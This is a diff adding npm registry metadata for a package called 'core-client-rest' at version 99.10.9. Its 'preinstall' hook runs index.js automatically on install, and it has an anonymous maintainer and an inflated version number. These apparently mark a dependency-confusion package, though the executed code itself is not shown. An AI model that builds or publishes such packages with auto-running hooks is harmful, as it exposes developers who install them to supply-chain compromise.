@@ -1,0 +1,39 @@
+{
+    "name": "core-client-rest",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "core-client-rest@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-GpGcV5ES/Abvtlq5Bkc6joWjdJ/J6V7XHftxjrMtr03VvRQqr4Ee9vB0h6RJEdoDEtGkDyC7DFZK42KEto8v5g==",
+        "shasum": "30bc2375b5d8ecfb24b9bbecd9f9cae92c463aca",
+        "tarball": "https://registry.npmjs.org/core-client-rest/-/core-client-rest-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5068,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPIaJACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmrqqg/6A94eQ5zGWdwaMlRka2xlSU3BmX8UHzCOcU0KFcdupRlqSitC\r\nQuEXPV/etfe0iHtE84VcN8lnoOWJ2mdFOzEZ4ELKuU5luk6UQMkF99e6P0n4\r\nv+U1HShM7ZLQn/Xij+YhiB45QHNmKRLCr+auyUlr1JNNvCIg4Mk149PIRBSX\r\nsk90UL+b6mlLBv9no72tCOd4Y4/j7QJ3YuB8yZGis+Eop3lN+Qmg9SDIeXzD\r\nPx4NnZDpdfXJ68xVzQtS5QlFNu3h2t2H4IUPAu2K9UCGZT26v2n/n+IqJzFF\r\nmkS+zFNtJ1wfF6kUA5oBiom8UTJargrYjLm429c8rCLfdlEKoqY0GOmuaOzm\r\n4Mjo90nkig2ekejg4OfI7vLRHiwOL6YN+K3iDdeZZZcoALZ/YG10YFJbwwGu\r\n/QP645QYbcLAX5JkHzo/ZMVzKgN6C+Y7A7DpHw6d8PBaj0MvEPci8No8d9LN\r\nc0BynBdCszq5gZfgeZTzJCocof2JD3/VKVMqZZDywGTBnNhrQ5Ked5hvy+Km\r\ncqF2wlcfKX9xKKHq0YBCVuY0qIO+3sWJ6sej22jBiqaIsw0SxiMYdicZ/GIy\r\nJhWiIGGV5UK/jbeFBupZChPdJ922s6h2ltRtQH9CMAHZJ1Qzftyh94x7xQba\r\nHH04KeKQHCBbpgFKpg2mY1VlcwXIC2ifYuQ=\r\n=so9B\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hgf47cpt",
+        "email": "hgf47cpt@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hgf47cpt",
+            "email": "hgf47cpt@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/core-client-rest_99.10.9_1648133768934_0.44785556718202413"
+    },
+    "_hasShrinkwrap": false
+}
